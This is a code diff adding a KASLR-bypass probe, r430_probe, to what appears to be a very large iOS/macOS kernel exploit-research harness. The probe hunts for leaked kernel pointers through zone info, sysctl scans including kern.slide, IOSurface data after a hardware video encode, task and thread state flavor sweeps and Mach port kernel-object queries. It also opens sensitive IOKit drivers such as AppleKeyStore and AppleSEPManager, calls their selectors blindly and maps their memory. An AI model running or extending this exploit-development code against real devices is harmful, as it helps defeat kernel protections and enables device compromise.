@@ -16734,6 +16734,517 @@ static void r428_sighandler(int sig) {
  * surf pointer itself) for any kernel pointers or interesting data.
  */
 
+static void r430_probe(void) {
+    rlog("\n=== r430: Alternative KASLR Vectors ===\n");
+    rlog("  host_zone_info, sysctl scan, VT encode, exception state\n\n");
+    fflush(stdout);
+
+    /* Vector A: host_zone_info — historically leaked zone addresses */
+    rlog("  --- Vector A: host_zone_info ---\n");
+    {
+        mach_zone_name_t *names = NULL;
+        mach_msg_type_number_t namesCnt = 0;
+        mach_zone_info_t *info = NULL;
+        mach_msg_type_number_t infoCnt = 0;
+        host_zone_info_fn hzi_fn = (host_zone_info_fn)dlsym(RTLD_DEFAULT, "host_zone_info");
+        kern_return_t kr = -1;
+        if (hzi_fn) {
+            kr = hzi_fn(mach_host_self(), &names, &namesCnt, &info, &infoCnt);
+        }
+        rlog("    host_zone_info: fn=%p kr=%d namesCnt=%u infoCnt=%u\n", hzi_fn, kr, namesCnt, infoCnt);
+        if (kr == 0 && namesCnt > 0) {
+            int kptr_found = 0;
+            for (unsigned i = 0; i < namesCnt && i < 200; i++) {
+                /* Check all fields for kernel-like addresses */
+                uint64_t *raw = (uint64_t *)&info[i];
+                int nfields = sizeof(mach_zone_info_t) / 8;
+                for (int f = 0; f < nfields; f++) {
+                    if ((raw[f] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("    *** KPTR zone[%u] '%s' field[%d]: 0x%016llx ***\n",
+                             i, names[i].mzn_name, f, (unsigned long long)raw[f]);
+                        kptr_found++;
+                    }
+                }
+                if (i < 10) {
+                    rlog("    zone[%u] '%s': cur_size=%llu max_size=%llu elem_size=%llu\n",
+                         i, names[i].mzn_name,
+                         (unsigned long long)info[i].mzi_cur_size,
+                         (unsigned long long)info[i].mzi_max_size,
+                         (unsigned long long)info[i].mzi_elem_size);
+                }
+            }
+            if (kptr_found == 0) rlog("    No kernel pointers in zone info\n");
+            vm_deallocate(mach_task_self(), (vm_address_t)names, namesCnt * sizeof(*names));
+            vm_deallocate(mach_task_self(), (vm_address_t)info, infoCnt * sizeof(*info));
+        } else {
+            rlog("    host_zone_info not available (kr=%d)\n", kr);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: sysctl scan for kernel addresses */
+    rlog("\n  --- Vector B: sysctl kern/hw scan ---\n");
+    {
+        /* Key sysctl OIDs that have historically leaked kernel info */
+        struct { const char *name; } sysctls[] = {
+            {"kern.boottime"},
+            {"kern.osversion"},
+            {"kern.version"},
+            {"kern.uuid"},
+            {"kern.bootsessionuuid"},
+            {"hw.memsize"},
+            {"hw.physicalcpu"},
+            {"hw.logicalcpu"},
+            {"hw.cachelinesize"},
+            {"hw.l1icachesize"},
+            {"hw.l1dcachesize"},
+            {"hw.l2cachesize"},
+            {"hw.l3cachesize"},
+            {"hw.tbfrequency"},
+            {"hw.cpufrequency"},
+            {"hw.busfrequency"},
+            {"kern.maxvnodes"},
+            {"kern.maxproc"},
+            {"kern.maxfilesperproc"},
+            {"kern.argmax"},
+            {"kern.slide"},  /* Might return kernel slide directly on some versions */
+            {"vm.swapusage"},
+            {"machdep.cpu.brand_string"},
+        };
+        int kptr_found = 0;
+        for (int i = 0; i < (int)(sizeof(sysctls)/sizeof(sysctls[0])); i++) {
+            uint64_t buf[16] = {0};
+            size_t len = sizeof(buf);
+            int ret = sysctlbyname(sysctls[i].name, buf, &len, NULL, 0);
+            if (ret == 0 && len >= 8) {
+                for (size_t j = 0; j < len / 8; j++) {
+                    if ((buf[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("    *** KPTR sysctl '%s' [%zu]: 0x%016llx ***\n",
+                             sysctls[i].name, j, (unsigned long long)buf[j]);
+                        kptr_found++;
+                    }
+                }
+                if (strcmp(sysctls[i].name, "kern.slide") == 0) {
+                    rlog("    kern.slide: 0x%016llx (len=%zu)\n",
+                         (unsigned long long)buf[0], len);
+                }
+            } else if (ret != 0 && strcmp(sysctls[i].name, "kern.slide") == 0) {
+                rlog("    kern.slide: errno=%d (%s)\n", errno, strerror(errno));
+            }
+        }
+        /* Also try numeric OIDs for kern.slide variants */
+        int mib_slide[] = {CTL_KERN, 0};
+        for (int sub = 100; sub < 150; sub++) {
+            mib_slide[1] = sub;
+            uint64_t val = 0;
+            size_t vlen = sizeof(val);
+            if (sysctl(mib_slide, 2, &val, &vlen, NULL, 0) == 0 && vlen == 8) {
+                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ||
+                    (val > 0x1000000 && val < 0x100000000ULL && (val & 0xFFF) == 0)) {
+                    rlog("    *** INTERESTING kern.%d: 0x%016llx (len=%zu) ***\n",
+                         sub, (unsigned long long)val, vlen);
+                    kptr_found++;
+                }
+            }
+        }
+        if (kptr_found == 0) rlog("    No kernel pointers in sysctl scan\n");
+    }
+    fflush(stdout);
+
+    /* Vector C: VTCompressionSession — hardware encode IOSurface */
+    rlog("\n  --- Vector C: VTCompressionSession encode ---\n");
+    {
+        /* Create an IOSurface suitable for video encoding */
+        int enc_w = 192, enc_h = 128;
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int enc_bpr = enc_w * 4, enc_as = enc_bpr * enc_h, enc_pf = 0x42475241; /* BGRA */
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &enc_w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &enc_h);
+        CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &enc_bpr);
+        CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &enc_as);
+        CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &enc_pf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), nb);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), na);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), nf);
+        IOSurfaceRef enc_surf = IOSurfaceCreate(sp);
+        CFRelease(sp); CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(na); CFRelease(nf);
+
+        if (enc_surf) {
+            rlog("    Encode surface: id=%u %dx%d\n", IOSurfaceGetID(enc_surf), enc_w, enc_h);
+
+            /* Fill with test pattern */
+            IOSurfaceLock(enc_surf, 0, NULL);
+            uint32_t *pix = (uint32_t*)IOSurfaceGetBaseAddress(enc_surf);
+            for (int y = 0; y < enc_h; y++)
+                for (int x = 0; x < enc_w; x++)
+                    pix[y * enc_w + x] = 0xFF000000 | ((x*2) << 16) | ((y*2) << 8) | 0x80;
+            IOSurfaceUnlock(enc_surf, 0, NULL);
+
+            /* Create CVPixelBuffer from IOSurface */
+            CVPixelBufferRef cvpb = NULL;
+            CVReturn cvr = CVPixelBufferCreateWithIOSurface(NULL, enc_surf, NULL, &cvpb);
+            rlog("    CVPixelBufferCreateWithIOSurface: %d\n", cvr);
+
+            if (cvr == 0 && cvpb) {
+                /* Create VTCompressionSession for H.264 */
+                VTCompressionSessionRef vtSession = NULL;
+                OSStatus vts = VTCompressionSessionCreate(NULL, enc_w, enc_h,
+                    kCMVideoCodecType_H264, NULL, NULL, NULL, NULL, NULL, &vtSession);
+                rlog("    VTCompressionSessionCreate: %d\n", (int)vts);
+
+                if (vts == 0 && vtSession) {
+                    /* Set properties for fast encode */
+                    VTSessionSetProperty(vtSession, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                    VTSessionSetProperty(vtSession, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+                    VTCompressionSessionPrepareToEncodeFrames(vtSession);
+
+                    /* Encode the frame */
+                    CMTime pts = CMTimeMake(0, 30);
+                    CMTime dur = CMTimeMake(1, 30);
+                    vts = VTCompressionSessionEncodeFrame(vtSession, cvpb, pts, dur, NULL, NULL, NULL);
+                    rlog("    EncodeFrame: %d\n", (int)vts);
+
+                    /* Flush to get output */
+                    vts = VTCompressionSessionCompleteFrames(vtSession, kCMTimeInvalid);
+                    rlog("    CompleteFrames: %d\n", (int)vts);
+
+                    /* Now check the IOSurface after encoding for any kernel metadata */
+                    IOSurfaceLock(enc_surf, kIOSurfaceLockReadOnly, NULL);
+
+                    /* Check shared data for new content */
+                    void *shrp = *(void**)((char*)enc_surf + 8);
+                    if (shrp) {
+                        uint64_t *sq = (uint64_t*)shrp;
+                        rlog("    Post-encode shared data scan (256 bytes):\n");
+                        int enc_kptr = 0;
+                        for (int i = 0; i < 32; i++) {
+                            if ((sq[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      +%d: 0x%016llx *** KPTR ***\n", i*8, (unsigned long long)sq[i]);
+                                enc_kptr++;
+                            }
+                        }
+                        if (enc_kptr == 0) rlog("      No kernel pointers in shared data after encode\n");
+                    }
+
+                    /* Check backing store for kernel metadata written by encoder */
+                    void *base = IOSurfaceGetBaseAddress(enc_surf);
+                    uint64_t *bp = (uint64_t*)base;
+                    int enc_kptr2 = 0;
+                    for (int i = 0; i < (enc_as / 8); i++) {
+                        if ((bp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("    *** KPTR in backing store +%d: 0x%016llx ***\n",
+                                 i*8, (unsigned long long)bp[i]);
+                            enc_kptr2++;
+                            if (enc_kptr2 >= 10) break;
+                        }
+                    }
+                    if (enc_kptr2 == 0) rlog("    No kernel pointers in backing store after encode\n");
+
+                    IOSurfaceUnlock(enc_surf, kIOSurfaceLockReadOnly, NULL);
+
+                    /* Check all IOSurface properties after encode */
+                    CFDictionaryRef allProps = IOSurfaceCopyAllValues(enc_surf);
+                    if (allProps) {
+                        CFDataRef xmlData = CFPropertyListCreateData(NULL, allProps,
+                            kCFPropertyListXMLFormat_v1_0, 0, NULL);
+                        if (xmlData) {
+                            const char *xml = (const char*)CFDataGetBytePtr(xmlData);
+                            CFIndex xmlLen = CFDataGetLength(xmlData);
+                            /* Scan XML for hex values that look like kernel pointers */
+                            int xml_kptr = 0;
+                            for (CFIndex pos = 0; pos < xmlLen - 18; pos++) {
+                                if (xml[pos] == '0' && xml[pos+1] == 'x') {
+                                    char hexbuf[20] = {0};
+                                    int hlen = 0;
+                                    for (int h = 0; h < 18 && pos+h < xmlLen; h++) {
+                                        char c = xml[pos+h];
+                                        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
+                                            (c >= 'A' && c <= 'F') || c == 'x') {
+                                            hexbuf[hlen++] = c;
+                                        } else break;
+                                    }
+                                    if (hlen >= 16) {
+                                        uint64_t v = strtoull(hexbuf, NULL, 16);
+                                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                            rlog("    *** KPTR in props XML: %s ***\n", hexbuf);
+                                            xml_kptr++;
+                                        }
+                                    }
+                                }
+                            }
+                            rlog("    Post-encode props: %lld bytes, %d keys, %d kptrs\n",
+                                 (long long)xmlLen, (int)CFDictionaryGetCount(allProps), xml_kptr);
+                            CFRelease(xmlData);
+                        }
+                        CFRelease(allProps);
+                    }
+
+                    VTCompressionSessionInvalidate(vtSession);
+                    CFRelease(vtSession);
+                }
+                CFRelease(cvpb);
+            }
+            CFRelease(enc_surf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: task_info extended flavors */
+    rlog("\n  --- Vector D: task_info extended flavors ---\n");
+    {
+        /* TASK_VM_INFO (flavor 22) */
+        task_vm_info_data_t vminfo;
+        mach_msg_type_number_t vmcnt = TASK_VM_INFO_COUNT;
+        kern_return_t kr = task_info(mach_task_self(), TASK_VM_INFO,
+            (task_info_t)&vminfo, &vmcnt);
+        rlog("    TASK_VM_INFO: kr=%d count=%u\n", kr, vmcnt);
+        if (kr == 0) {
+            rlog("      virtual_size=%llu resident=%llu reusable=%llu\n",
+                 (unsigned long long)vminfo.virtual_size,
+                 (unsigned long long)vminfo.resident_size,
+                 (unsigned long long)vminfo.reusable);
+            rlog("      min_address=0x%llx max_address=0x%llx\n",
+                 (unsigned long long)vminfo.min_address,
+                 (unsigned long long)vminfo.max_address);
+            /* Scan all fields */
+            uint64_t *raw = (uint64_t*)&vminfo;
+            int nf = (vmcnt * 4) / 8;
+            int kptr_cnt = 0;
+            for (int i = 0; i < nf; i++) {
+                if ((raw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("      *** KPTR field[%d]: 0x%016llx ***\n", i, (unsigned long long)raw[i]);
+                    kptr_cnt++;
+                }
+            }
+            if (kptr_cnt == 0) rlog("      No kernel pointers in TASK_VM_INFO\n");
+        }
+
+        /* TASK_EXTMOD_INFO (flavor 25) */
+        uint64_t extmod[32] = {0};
+        mach_msg_type_number_t emcnt = 32;
+        kr = task_info(mach_task_self(), 25, (task_info_t)extmod, &emcnt);
+        rlog("    TASK_EXTMOD_INFO(25): kr=%d count=%u\n", kr, emcnt);
+        if (kr == 0 && emcnt > 0) {
+            for (unsigned i = 0; i < emcnt * 4 / 8; i++) {
+                if ((extmod[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("      *** KPTR [%u]: 0x%016llx ***\n", i, (unsigned long long)extmod[i]);
+                }
+            }
+        }
+
+        /* Flavors 26-35 that we may not have tried */
+        for (int flav = 26; flav <= 40; flav++) {
+            uint64_t buf[64] = {0};
+            mach_msg_type_number_t cnt = 64;
+            kr = task_info(mach_task_self(), flav, (task_info_t)buf, &cnt);
+            if (kr == 0 && cnt > 0) {
+                rlog("    task_info(%d): kr=0 count=%u\n", flav, cnt);
+                for (unsigned i = 0; i < cnt * 4 / 8; i++) {
+                    if ((buf[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      *** KPTR flavor %d [%u]: 0x%016llx ***\n",
+                             flav, i, (unsigned long long)buf[i]);
+                    }
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* Vector E: thread exception state + debug state */
+    rlog("\n  --- Vector E: thread exception + debug state ---\n");
+    {
+        thread_port_t self_thread = mach_thread_self();
+
+        /* ARM_EXCEPTION_STATE64 (flavor 9) */
+        arm_exception_state64_t exc_state;
+        mach_msg_type_number_t exc_cnt = ARM_EXCEPTION_STATE64_COUNT;
+        kern_return_t kr = thread_get_state(self_thread, ARM_EXCEPTION_STATE64,
+            (thread_state_t)&exc_state, &exc_cnt);
+        rlog("    ARM_EXCEPTION_STATE64: kr=%d cnt=%u\n", kr, exc_cnt);
+        if (kr == 0) {
+            rlog("      far=0x%016llx esr=0x%08x exception=0x%08x\n",
+                 (unsigned long long)exc_state.__far,
+                 exc_state.__esr, exc_state.__exception);
+            if ((exc_state.__far & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                rlog("      *** KPTR in FAR! ***\n");
+        }
+
+        /* ARM_DEBUG_STATE64 (flavor 15) */
+        arm_debug_state64_t dbg_state;
+        mach_msg_type_number_t dbg_cnt = ARM_DEBUG_STATE64_COUNT;
+        kr = thread_get_state(self_thread, ARM_DEBUG_STATE64,
+            (thread_state_t)&dbg_state, &dbg_cnt);
+        rlog("    ARM_DEBUG_STATE64: kr=%d cnt=%u\n", kr, dbg_cnt);
+        if (kr == 0) {
+            /* Scan breakpoint/watchpoint registers */
+            for (int i = 0; i < 16; i++) {
+                if (dbg_state.__bvr[i] != 0) {
+                    rlog("      bvr[%d]=0x%016llx bcr[%d]=0x%016llx\n",
+                         i, (unsigned long long)dbg_state.__bvr[i],
+                         i, (unsigned long long)dbg_state.__bcr[i]);
+                    if ((dbg_state.__bvr[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog("        *** KPTR in BVR! ***\n");
+                }
+            }
+            for (int i = 0; i < 16; i++) {
+                if (dbg_state.__wvr[i] != 0) {
+                    rlog("      wvr[%d]=0x%016llx wcr[%d]=0x%016llx\n",
+                         i, (unsigned long long)dbg_state.__wvr[i],
+                         i, (unsigned long long)dbg_state.__wcr[i]);
+                    if ((dbg_state.__wvr[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog("        *** KPTR in WVR! ***\n");
+                }
+            }
+        }
+
+        /* Try thread_info flavors we might have missed */
+        for (int flav = 10; flav <= 30; flav++) {
+            uint64_t buf[64] = {0};
+            mach_msg_type_number_t cnt = 64;
+            kr = thread_get_state(self_thread, flav, (thread_state_t)buf, &cnt);
+            if (kr == 0 && cnt > 0) {
+                rlog("    thread_get_state(%d): cnt=%u\n", flav, cnt);
+                for (unsigned i = 0; i < (cnt * 4) / 8; i++) {
+                    if ((buf[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      *** KPTR flavor %d [%u]: 0x%016llx ***\n",
+                             flav, i, (unsigned long long)buf[i]);
+                    }
+                }
+            }
+        }
+
+        mach_port_deallocate(mach_task_self(), self_thread);
+    }
+    fflush(stdout);
+
+    /* Vector F: host_info / host_statistics for kernel pointer leaks */
+    rlog("\n  --- Vector F: host_info / host_statistics ---\n");
+    {
+        /* HOST_VM_INFO64 */
+        vm_statistics64_data_t vmstat;
+        mach_msg_type_number_t cnt = HOST_VM_INFO64_COUNT;
+        kern_return_t kr = host_statistics64(mach_host_self(), HOST_VM_INFO64,
+            (host_info64_t)&vmstat, &cnt);
+        rlog("    HOST_VM_INFO64: kr=%d cnt=%u\n", kr, cnt);
+        if (kr == 0) {
+            uint64_t *raw = (uint64_t*)&vmstat;
+            for (unsigned i = 0; i < cnt * 4 / 8; i++) {
+                if ((raw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("      *** KPTR [%u]: 0x%016llx ***\n", i, (unsigned long long)raw[i]);
+                }
+            }
+        }
+
+        /* HOST_PRIORITY_INFO */
+        host_priority_info_data_t priinfo;
+        cnt = HOST_PRIORITY_INFO_COUNT;
+        kr = host_info(mach_host_self(), HOST_PRIORITY_INFO, (host_info_t)&priinfo, &cnt);
+        rlog("    HOST_PRIORITY_INFO: kr=%d cnt=%u\n", kr, cnt);
+
+        /* Try processor_info */
+        processor_set_name_port_t pset;
+        kr = processor_set_default(mach_host_self(), &pset);
+        rlog("    processor_set_default: kr=%d pset=0x%x\n", kr, pset);
+        if (kr == 0) {
+            /* Try HOST_PROCESSOR_SET_PRIV (get privileged port) */
+            processor_set_t pset_priv;
+            kr = host_processor_set_priv(mach_host_self(), pset, &pset_priv);
+            rlog("    host_processor_set_priv: kr=%d\n", kr);
+        }
+
+        /* Try mach_port_kobject on the host port */
+        natural_t ktype = 0;
+        mach_vm_address_t kaddr = 0;
+        kr = mach_port_kobject(mach_task_self(), mach_host_self(), &ktype, (mach_port_address_t*)&kaddr);
+        rlog("    mach_port_kobject(host): kr=%d type=%u addr=0x%llx\n",
+             kr, ktype, (unsigned long long)kaddr);
+
+        /* Try mach_port_kernel_object */
+        unsigned int ktype2 = 0;
+        unsigned int kaddr2 = 0;
+        kr = mach_port_kernel_object(mach_task_self(), mach_host_self(), &ktype2, &kaddr2);
+        rlog("    mach_port_kernel_object(host): kr=%d type=%u addr=0x%x\n",
+             kr, ktype2, kaddr2);
+    }
+    fflush(stdout);
+
+    /* Vector G: IOKit registry walk — look for other user clients */
+    rlog("\n  --- Vector G: IOKit driver enumeration ---\n");
+    {
+        const char *drivers[] = {
+            "AppleAVE2Driver", "AppleAVE2UserClient",
+            "AppleH13CamIn", "AppleJPEGDriver",
+            "AppleSPU", "AGXAccelerator",
+            "IOGPUDevice", "AGXFamilyAccelerator",
+            "AppleT8160PMGR", "AppleMobileFileIntegrity",
+            "AppleCredentialManager", "AppleSEPManager",
+            "AppleKeyStore", "IOUserEthernetController",
+            "AppleARMPE", "ApplePMGR",
+        };
+        for (int i = 0; i < (int)(sizeof(drivers)/sizeof(drivers[0])); i++) {
+            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching(drivers[i]));
+            if (svc) {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                rlog("    %s: svc=0x%x open=%d conn=0x%x\n",
+                     drivers[i], svc, kr, conn);
+                if (kr == 0 && conn) {
+                    /* Try IOConnectCallMethod selectors 0-5 */
+                    for (int sel = 0; sel < 6; sel++) {
+                        uint64_t out[8] = {0};
+                        uint32_t outcnt = 8;
+                        kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                            NULL, 0, NULL, 0, out, &outcnt, NULL, NULL);
+                        if (kr2 == 0 && outcnt > 0) {
+                            rlog("      sel %d: out[0]=0x%016llx outcnt=%u\n",
+                                 sel, (unsigned long long)out[0], outcnt);
+                            for (uint32_t j = 0; j < outcnt; j++) {
+                                if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                    rlog("        *** KPTR out[%u]=0x%016llx ***\n",
+                                         j, (unsigned long long)out[j]);
+                            }
+                        }
+                    }
+                    /* Try MapMemory */
+                    for (uint32_t mt = 0; mt < 4; mt++) {
+                        mach_vm_address_t maddr = 0;
+                        mach_vm_size_t msz = 0;
+                        kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                            &maddr, &msz, kIOMapAnywhere);
+                        if (kr == 0 && msz > 0) {
+                            rlog("      MapMemory(%u): addr=0x%llx size=0x%llx\n",
+                                 mt, (unsigned long long)maddr, (unsigned long long)msz);
+                            /* Scan for kernel pointers */
+                            uint64_t *mp = (uint64_t*)maddr;
+                            int mkptr = 0;
+                            size_t scan_sz = (msz > 0x10000) ? 0x10000 : (size_t)msz;
+                            for (size_t j = 0; j < scan_sz / 8; j++) {
+                                if ((mp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("        *** KPTR +%zu: 0x%016llx ***\n",
+                                         j*8, (unsigned long long)mp[j]);
+                                    mkptr++;
+                                    if (mkptr >= 10) break;
+                                }
+                            }
+                            IOConnectUnmapMemory64(conn, mt, mach_task_self(), maddr);
+                        }
+                    }
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r430 complete ===\n");
+    fflush(stdout);
+}
+
 static void r429_probe(void) {
     rlog("\n=== r429: Shared Data Target Analysis ===\n\n");
     fflush(stdout);
@@ -73718,6 +74229,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 433) {
+            rlog("*** rounds=433: Alternative KASLR Vectors ***\n");
+            rlog("  host_zone_info, sysctl, VT encode, exception state, IOKit drivers\n\n");
+            fflush(stdout);
+            r430_probe();
+            goto done;
+        }
         if (rounds == 432) {
             rlog("*** rounds=432: Shared Data Target Analysis + SID Swap ***\n");
             rlog("  Dump +120/+128 targets, full ClientRef, surface ID swap test.\n\n");
@@ -76334,7 +76852,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
